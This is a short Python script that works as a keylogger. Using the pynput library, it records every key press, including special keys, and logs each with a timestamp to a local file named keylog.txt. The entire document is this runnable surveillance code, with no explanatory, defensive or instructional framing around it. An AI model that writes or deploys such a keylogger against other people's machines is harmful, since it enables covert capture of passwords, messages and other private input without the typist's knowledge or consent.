import pynput
from pynput.keyboard import Key, Listener
import logging

# Set up logging to file
log_dir = ""
logging.basicConfig(filename=(log_dir + "keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define the on_press function to capture each key press
def on_press(key):
    try:
        logging.info('Key pressed: {0}'.format(key.char))
    except AttributeError:
        logging.info('Special Key pressed: {0}'.format(key))

# Set up the listener to detect key presses
with Listener(on_press=on_press) as listener:
    listener.join()
